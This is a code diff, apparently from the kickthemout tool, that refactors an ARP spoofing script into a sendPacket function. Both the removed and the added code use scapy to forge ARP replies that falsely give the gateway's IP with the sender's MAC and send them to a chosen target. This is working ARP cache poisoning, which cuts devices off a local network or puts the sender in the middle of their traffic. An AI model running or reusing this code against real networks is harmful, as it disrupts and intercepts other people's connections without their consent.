@@ -1,46 +1,31 @@
-import sys
-from scapy.all import (
-    get_if_hwaddr,
-    getmacbyip,
-    ARP,
-    Ether,
-    sendp
-)
+#kickthemout/scan.py by @xdavidhu
 
-try:
-    my_mac = sys.argv[1]
-    interface = sys.argv[2]
-    my_ip = sys.argv[3]
-    target_ip = sys.argv[4]
-    target_mac = sys.argv[5]
-except:
-    print "Usage: sudo python spoof.py [MY_MAC] [IFACE] [GATEWAY_IP] [TARGET_IP] [TARGET_MAC]"
-    exit()
+def sendPacket(my_mac, gateway_ip, target_ip, target_mac):
 
-ether = Ether()
-ether.src = my_mac # Default: network card mac
+    import sys
+    from scapy.all import (
+        get_if_hwaddr,
+        getmacbyip,
+        ARP,
+        Ether,
+        sendp
+    )
 
-arp = ARP()
-arp.psrc = my_ip
-arp.hwsrc = my_mac
+    ether = Ether()
+    ether.src = my_mac
 
-arp = arp
-arp.pdst = target_ip # Default: 0.0.0.0
-arp.hwdst = target_mac # Default: 00:00:00:00:00:00
+    arp = ARP()
+    arp.psrc = gateway_ip
+    arp.hwsrc = my_mac
 
-ether = ether
-ether.src = my_mac
-ether.dst = target_mac # Default: ff:ff:ff:ff:ff:f
+    arp = arp
+    arp.pdst = target_ip
+    arp.hwdst = target_mac
 
-def craftRequestPkt():
-    packet = ether/arp
-    sendp(x=packet, inter=1, count=1000)
+    ether = ether
+    ether.src = my_mac
+    ether.dst = target_mac
 
-def craftReplyPkt():
     arp.op = 2
     packet = ether/arp
-    sendp(x=packet, inter=1, count=1000)
-
-
-if __name__ == '__main__':
-    craftReplyPkt()
+    sendp(x=packet, verbose=False)
